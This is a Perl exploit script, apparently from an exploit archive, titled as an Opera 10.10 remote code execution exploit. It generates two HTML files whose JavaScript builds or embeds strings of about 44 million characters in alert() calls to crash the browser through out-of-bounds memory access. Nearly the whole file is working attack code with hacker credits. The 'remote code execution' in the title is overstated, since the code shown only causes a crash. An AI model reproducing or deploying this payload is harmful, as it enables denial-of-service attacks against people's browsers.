#!/usr/bin/perl


# Title : Opera 10.10 Remote Code Execution DoS Exploit
# Tested : Windows xp (sp2)

# Description : Opera Web Browser is vulnerable DoS within its javascript tags (alert)
# This issue can be exploited by using a large value in a alert tags to create an out-of-bounds memory access 
# This have in advising at version 9.10 http://www.milw0rm.com/exploits/3871, and good news this issue still work on version 10.10

# Credits to Dj7xpl \ first exploiter
# Greetz : str0ke a great man :)
#          muts and exploit-db
#          opt!x hacker my best friend :d
#          and all INDONESIAN hacker community
# cr4wl3r kiss your soul from Gorontalo - INDONESIA

# Sorry for my bad english :p~

print qq(
###################################################
## Opera 10.10 Remote Code Execution DoS Exploit ##
## Credits : Dj7xpl                              ##
##           http://www.milw0rm.com/exploits/3871##
## Author : cr4wl3r <cr4wl3r[!]linuxmail.org>    ##
## Greetz : str0ke, opt!x hacker, xoron          ##
## all member at manadocoding.net                ##
## all member at indonesianhacker.org            ##
###################################################
);

my $header = "<html>\n<script>\n";
my $footer = "</script>\n</html>";


my $uhoh1 = "var buf = 'A';\n".
           "while (buf.length <= 44444444) buf+=buf;\n".
           "alert(buf)\n";

##################################################################
open(myfile,'>> uhoh1.html');
print myfile $header.$uhoh1.$footer;
##################################################################


my $uhoh2 = "alert(\'". "A" x 44444444 ."'\)"."\n";

##################################################################
open(myfile,'>> uhoh2.html');
print myfile $header.$uhoh2.$footer;
##################################################################

print "\nDone, successfully created!\n";